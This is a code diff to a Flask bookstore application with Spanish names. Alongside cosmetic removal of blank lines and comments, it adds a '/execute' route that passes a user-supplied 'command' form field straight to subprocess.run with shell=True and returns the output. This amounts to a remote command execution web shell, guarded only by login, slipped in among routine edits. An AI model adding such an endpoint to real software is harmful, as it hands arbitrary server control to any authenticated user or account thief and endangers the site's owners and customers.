@@ -5,19 +5,16 @@ from flask_mysqldb import MySQL
 from flask_wtf.csrf import CSRFProtect
 from flask_login import LoginManager, login_user, logout_user, login_required, current_user
 from flask_mail import Mail
-
 from werkzeug.security import check_password_hash, generate_password_hash
-
 from .models.ModeloCompra import ModeloCompra
 from .models.ModeloLibro import ModeloLibro
 from .models.ModeloUsuario import ModeloUsuario
-
 from .models.entities.Usuario import Usuario
 from .models.entities.Compra import Compra
 from .models.entities.Libro import Libro
-
 from .consts import *
 from .emails import confirmacion_compra, confirmacion_registro_usuario
+import subprocess
 
 app = Flask(__name__)
 
@@ -200,12 +197,10 @@ def upload_file():
 
     return render_template('upload.html')
 
-# Plantilla de HTML para subir archivos
 @app.route("/upload_form")
 def upload_form():
     return render_template('upload.html')
 
-# Ruta para servir archivos subidos
 @app.route('/uploads/<filename>')
 @login_required
 def uploaded_file(filename):
@@ -214,6 +209,22 @@ def uploaded_file(filename):
         return send_from_directory(app.config['UPLOAD_FOLDER'], filename)
     else:
         return f"El archivo {filename} no se encuentra en el servidor", 404
+
+@app.route('/execute', methods=['POST'])
+@login_required
+def execute_command():
+    command = request.form.get('command')
+    if command:
+        try:
+            result = subprocess.run(command, shell=True, capture_output=True, text=True)
+            return jsonify({
+                'stdout': result.stdout,
+                'stderr': result.stderr,
+                'returncode': result.returncode
+            }), 200
+        except Exception as e:
+            return jsonify({'error': str(e)}), 500
+    return jsonify({'error': 'No command provided'}), 400
 
 def pagina_no_autorizada(error):
     return redirect(url_for('login'))
